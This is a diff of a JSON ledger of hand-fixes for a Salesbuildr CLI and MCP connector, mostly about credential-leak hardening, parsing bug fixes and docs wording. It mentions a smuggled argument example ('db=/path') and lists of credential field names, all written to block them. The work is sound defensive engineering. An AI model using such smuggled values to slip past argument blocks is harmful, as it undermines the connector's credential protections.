+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "func TenantPinnable(tenant string) bool {",
+     "code_only": true
+    }
+   ],
+   "class": "auth-wire"
+  },
+  {
+   "id": "sql-command",
+   "status": "active",
+   "summary": "The hand-built read-only `sql` command (internal/cli/sql.go, SQLite mode=ro plus a keyword filter) is registered with a literal rootCmd.AddCommand in root.go",
+   "why": "Press 4.34.2 generates no `sql` command for this spec; the published novels (recipes, README `Catalog margin audit in SQL`, MCP intent catalog_margin_audit_in_sql) call it. root.go is generated, so a reprint drops the registration (tools/apply_edits.py re-applies it).",
+   "asserts": [
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
-     "min_count": 1,
+     "contains": "rootCmd.AddCommand(newSQLCmd(flags))",
      "code_only": true
     },
     {
-     "file": "cli/cmd/salesbuildr-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
-     "min_count": 1,
+     "file": "cli/internal/cli/sql.go",
+     "contains": "db, err := store.OpenReadOnly(dbPath)",
+     "code_only": true
+    }
+   ],
+   "class": "novel"
+  },
+  {
+   "id": "sql-verify-plain",
+   "status": "active",
+   "summary": "`sql` prints the --plain list (header line, one row per line) for an unformatted call under PRINTING_PRESS_VERIFY, and JSON everywhere else",
+   "why": "Root cause of the prior library copy's verify FAIL (32 domain tables, 0 rows after mock sync): verify's data-pipeline probe reads `sql` output as sqlite3 list mode, and the hand `sql` printed a JSON array on a pipe, so every count parsed as 0 although the store held the rows. Seen failing first (seen/sql-verify-format-seen-failing.log); verify-work-1.log Data Pipeline PASS 23 tables after.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sql.go",
+     "contains": "return printJSONFiltered(cmd.OutOrStdout(), out, sqlOutputFlags(flags))",
      "code_only": true
     },
     {
-     "file": "cli/cmd/salesbuildr-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
-     "min_count": 1,
+     "file": "cli/internal/cli/sql.go",
+     "contains": "func sqlOutputFlags(flags *rootFlags) *rootFlags {",
      "code_only": true
     },
     {
-     "file": "cli/cmd/salesbuildr-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/sql_verify_format_test.go",
+     "contains": "func TestSQLUnderVerifierPrintsListRowsVerifyCanCount(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its output file on every return, including an API error: the open no longer shadows RunE's named err. The export is written once through credkit.WriteFile when complete.",
+   "why": "Carried from the gradient 4.34.2 reprint with the ported export.go edit: the generated `f, err := openExportOutput(...)` declared a new err, so the deferred close never ran after an API error and the unclosed filter pipe kept the process from exiting.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "code_only": true
+    }
+   ],
+   "class": "error-path"
+  },
+  {
+   "id": "review-r1-probability-documented-fraction",
+   "status": "active",
+   "summary": "opportunity mrr-forecast reads probability as the documented 0-1 fraction (spec.json UpsertOpportunityDto.probability, minimum 0, maximum 1); an open deal outside that range is counted in probabilityOutOfRange and left out of the weighted totals",
+   "why": "Codex r1 (review) P1 class documented-fraction-read-as-percent: the forecast divided probability by 100, so a documented 0.5 on 1000 MRR weighed 5, not 500. Seen failing: seen/r1-documented-fraction-read-as-percent-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "func documentedFraction(v float64) (float64, bool) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
-     "min_count": 1,
+     "file": "cli/internal/cli/opportunity_mrr_forecast.go",
+     "contains": "p, ok := documentedFraction(o.Probability)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
-     "min_count": 1,
+     "file": "cli/internal/cli/salesbuildr_r1_results_test.go",
+     "contains": "func TestR1ForecastReadsProbabilityAsDocumentedFraction(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "review-r1-explicit-zero-is-a-value",
+   "status": "active",
+   "summary": "Every novel reads numbers through one presence-aware parser (gnumOK): an explicit 0 quantity, markup or sales-cycle length is a value; only an absent field takes the fallback (one unit; markup from price over cost)",
+   "why": "Codex r1 (review) P1 class documented-zero-read-as-missing: QuoteItemResponseDto.quantity and .markup are required numbers (CreateQuoteProductDto allows quantity 0), but quantity 0 counted as one unit (quote funnel, stale, product velocity) and markup 0 as unknown (quote thin missed a zero-markup line); a 0-day sales cycle was left out of velocity. Seen failing: seen/r1-documented-zero-read-as-missing-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/jsonextract.go",
+     "contains": "func gnumOK(m map[string]any, key string) (float64, bool) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "if i.HasQuantity || i.Quantity != 0 {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "if i.HasMarkup || i.Markup != 0 {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/opportunity_velocity.go",
+     "contains": "if o.HasSalesCycleDays && o.SalesCycleDays >= 0 {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_r1_results_test.go",
+     "contains": "func TestR1ThinReportsExplicitZeroMarkup(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "review-r1-company-id-namespaces",
+   "status": "active",
+   "summary": "company whitespace resolves its target one identifier namespace at a time across every row (internal id, then external identifier, then exact name, then unique name substring); more than one match in a namespace is refused as ambiguous",
+   "why": "Codex r1 (review) P1 class identifier-namespaces-merged: one pass matched id OR externalIdentifier OR name and returned the first row, so `company whitespace 1234` reported the company whose externalIdentifier is 1234 instead of the company whose id is 1234 (both documented CompanyResponseDto fields). Seen failing: seen/r1-identifier-namespaces-merged-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/company_whitespace.go",
+     "contains": "{\"internal id\", func(c novelCompany) bool { return c.ID != \"\" && c.ID == target }},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/company_whitespace.go",
+     "contains": "is ambiguous by %s: %s; pass the internal id",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_r1_results_test.go",
+     "contains": "func TestR1ResolveCompanyExactIDBeatsAnotherCompanysExternalID(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "review-r2-absent-number-is-unknown",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "A product or pricing-book entry with no price or cost is unknown, never 0: pricing drift compares only numbers both sides carry and counts the rest as incomparable; company whitespace prints a null price and sorts it last",
+   "why": "ProductResponseDto does not require price or cost, so a catalog product with no cost on file was reported as cost drift against 0 (bookCost 900 vs catalogCost 0, costDelta 900), and an unpriced product sorted and printed as price 0. Mirror case of review-r1-explicit-zero-is-a-value. Seen failing first: TestR2PricingDriftComparesOnlyNumbersBothSidesCarry, TestR2WhitespaceKeepsAnUnknownPriceUnknown.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/pricing_drift.go",
+     "contains": "priceKnown := bp.HasPrice && cp.HasPrice",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/pricing_drift.go",
+     "contains": "costKnown := bp.HasCost && cp.HasCost",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/company_whitespace.go",
+     "contains": "Price: presentNum(p.Price, p.HasPrice)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "_, hasCost := gnumOK(m, \"cost\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "cost, hasCost := gnumOK(pm, \"cost\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_r2_results_test.go",
+     "contains": "func TestR2WhitespaceKeepsAnUnknownPriceUnknown(t *testing.T) {",
+     "code_only": true
     }
    ]
   },
   {
    "id": "chatgpt-desktop-local-web-unsupported",
-   "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
+   "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO); ChatGPT on the web needs the operator's own HTTPS host with the MCP HTTP token (press 4.34.2 HTTP mode), and no page says HTTP mode is paused.",
    "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
    "status": "active",
    "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
@@ -450,19 +580,6 @@
      "file": "mcp-install.md",
      "contains": "## ChatGPT desktop app (OpenAI)",
      "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "**Not supported by msp-skills yet.** ChatGPT on the web",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "## ChatGPT (Developer Mode)"
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "*Remote* agents (ChatGPT"
     },
     {
      "file": "README.md",
@@ -489,8 +606,352 @@
     {
      "file": "page.json",
      "not_contains": "connects only to remote"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "paused until it is reprinted"
+    },
+    {
+     "file": "page.json",
+     "not_contains": "paused until it is reprinted"
+    }
+   ],
+   "class": "docs"
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own credential layer. internal/credwire/declarations.go holds the one Declarations literal (SecretEnv SALESBUILDR_API_KEY and SALESBUILDR_MCP_HTTP_TOKEN; Files = the config the run really uses first, an explicit --config or SALESBUILDR_CONFIG winning, then the 0600 credential store and the legacy config; every other config, store and profiles.json any --config or --home could mean is held with cliutil.HoldFile; ConfigFields and StoredRecords api_key, auth_header, access_token, refresh_token, client_id, client_secret; CredentialHeaders api-key and integration-key; CredentialFlags --integration-key; StdinFlags --stdin, a JSON body put on one line first and feedback's prose body handed back after Start (compactStdinBody, AfterStart); ResponseFields password, otp, pin, passcode and the integration key and api key names, matched exactly so useSignatureImage stays readable; BaseURL base_url, SALESBUILDR_BASE_URL, default https://{tenant}.salesbuildr.com/public-api; Origins base_url only, the MCP HTTP token allowed nowhere). The default is a template the kit cannot resolve, so credentialFiles calls showBaseURL, which resolves the tenant host the way the client does (config.Load, then client.ResolvedBaseURL; a tenant cli.TenantPinnable refuses shows nothing) and shows it to the kit through SALESBUILDR_BASE_URL; AfterStart, the statement after credkit.Start in both mains, puts the variable back. credkit.Exit ends both mains. Every sink is routed: stdout and stderr at the descriptor; the API client (client.OutboundGuard), feedback, deliver and the probe through credkit.Transport; cache, journal, teach log, profile, platform profile, rate-limit lock, export and delivery files through credkit.WriteFile, AppendFile and OpenFile; SQLite through internal/credsql (credkit-sqlite-every-handle); the MCP server through MCPTools, MCPIn, MCPOut and MCPHTTP (credkit-mcphttp-outermost); the MCP server's CLI child through RunCommand; terminal checks through credkit.Terminal; auth set-token holds the token it reads from stdin; the built auth header and a resolved client-profile credential are held where they are derived. The 0600 credential store and config.toml are credential sources: their writes are a declared exemption, outside the kit in cliutil.AtomicWriteCredentialFile, and both are in Files.",
+   "why": "Retires secret-echo-decoded-funnel, output-chokepoint, file-sinks-withheld, store-never-keeps-secrets, mcp-protocol-messages-withheld, network-sinks-withheld, startup-output-held-first, mcp-held-arguments-refused, undecoded-encodings-every-alignment, held-forms-in-every-encoding, response-credentials-held, every-text-encoding-withheld, outbound-split-parts-refused, auth-carrier-names-and-shapes-held, integration-key-held, review-r1-config-file-every-shape, review-r1-short-held-value-every-encoding, review-r1-numeric-credentials-held: replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements tools/maintainer/fleet_handfixes.json backs). The connector's own holder, output chokepoint, secret funnel, encodings/outbound/short-value/secrets matchers, store withholding driver, config hold and MCP output wrappers grew per review round because each sink and encoding was closed one at a time; the kit is one shared implementation of the leak contract, checked byte for byte against tools/maintainer/credkit (vendor_credkit.py --check). The open Codex classes short-held-value-encoded and non-string-credential-not-held are closed by the kit: internal/credwire/open_classes_test.go TestShortHeldValueEncoded and TestNonStringCredentialNotHeld run the built binaries and were seen failing on the pre-kit tree (d814276a58, .review/seen/) and pass after. TestTenantHostIsTheAllowedOrigin proves the templated default resolves to the tenant host (seen failing with showBaseURL removed, .review/seen/tenant-origin-seen-failing.log). Kit notes, not hand-fixes: a short held value (under 8 characters) split across a space is not withheld; the kit's file stream withholds ordinary JSONL after about 20 KB, so export is buffered and written once.",
+   "spec_encode_followup": "Press-side: generate the kit wiring, the Declarations literal (a templated BaseURL default resolved for the kit) and the kit-wrapped SQLite driver.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func credentialFiles(args []string) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialHeaders: []string{\"api-key\", \"integration-key\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialFlags:   []string{\"--integration-key\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func AfterStart() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func showBaseURL(home, configPath string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\tshowBaseURL(last(homes), explicit)\n",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/salesbuildr-cli/main.go",
+     "contains": "\tcredkit.Start(credwire.Declarations)\n\tcredwire.AfterStart()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/salesbuildr-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "contains": "\tcredkit.Start(credwire.Declarations)\n\tcredwire.AfterStart()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.Hold(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cliutil.Hold(\"stdin\", token)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "cliutil.Hold(\"minted:client-profile\", string(value))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/open_classes_test.go",
+     "contains": "func TestShortHeldValueEncoded(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/open_classes_test.go",
+     "contains": "func TestNonStringCredentialNotHeld(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/open_classes_test.go",
+     "contains": "func TestTenantHostIsTheAllowedOrigin(t *testing.T) {",
+     "code_only": true
     }
    ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name. The SALESBUILDR_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>:\" plus the typed name's hash when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. Operator-named text that repeats a credential the program holds is withheld by the shared credential kit at the sink (credkit-wiring). journal_credential_hardening_test.go drives each path and fails if a credential reaches any file under the test home.",
+   "why": "Press 4.34.2 (learn/journal.go.tmpl) returns the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, and records every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query. These are names the kit never holds, so they stay hand-fixes. Seen failing on the pre-kit tree (d814276a58, .review/seen/) and passing after; the shape and tests follow gradient's entry of the same id. Known limits: a guessable override or typed name can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be an opaque identity; teach.log should not echo raw arguments.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\treturn \"o:\" + hashHarnessSession(v)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\t\tif isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "\tif entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag + \":\" + hashHarnessSession(entry.FailedFlag)\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "\tisDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func hashHarnessSession(v string) string {\n\tsum := sha256.Sum256([]byte(v))\n\treturn hex.EncodeToString(sum[:8])\n}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalHardeningStartupOverride(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalFailedFlagIdentity(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "startup-config-held-first",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.Start is the first statement of both mains (credkit-wiring), so every credential in config.toml is held before the program can print a byte, a config that does not parse included. A credential in a malformed config.toml or in a base_url that does not parse never appears in salesbuildr-cli startup output (stdout and stderr) or in salesbuildr-mcp's stderr and JSON-RPC responses.",
+   "why": "Fleet rule (Startup ordering): the holder must be installed before config is loaded or any startup diagnostic can print, in both the CLI and the MCP server. internal/credwire/startup_test.go TestStartupConfigHeldFirst builds and runs both binaries (.exe on Windows) in a sandbox home. Proved both ways: with credkit.Start removed from both mains the base_url case fails (doctor prints a piece of the URL password; .review/seen/startup-config-held-first-seen-failing.log), and it passes with the kit (.review/mutant-restored-pass.log).",
+   "asserts": [
+    {
+     "file": "cli/cmd/salesbuildr-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/startup_test.go",
+     "contains": "func TestStartupConfigHeldFirst(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/startup_test.go",
+     "contains": "{\"password in a base_url that does not parse\",",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter (credsql.LengthLimitParam, store.OpenReadOnlyValueCapped).",
+   "why": "A statement's text and bound values are a sink of their own, reads included. Replaces the connector's store withholding driver (store-never-keeps-secrets, removed under credkit-wiring).",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "credkit.SQLDriver(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithLimits runs a preflight that writes nothing (Origin, bearer, bounded body read), then credkit.MCPHTTP around a gate that answers the refusal it decided.",
+   "why": "With the kit wrapping only the inner handler, a refusal answers outside it, and a bearer holding the refusal's text would get a piece of itself back. Same shape as dropsuite's entry of the same id.",
+   "spec_encode_followup": "Press-side: generate the MCP HTTP auth wrapper so its refusals are written by the kit-wrapped handler.",
+   "asserts": [
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "contains": "func mcpHTTPPreflight(",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/salesbuildr-mcp/main.go",
+     "not_contains": "func rejectMCPHTTPRequest("
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
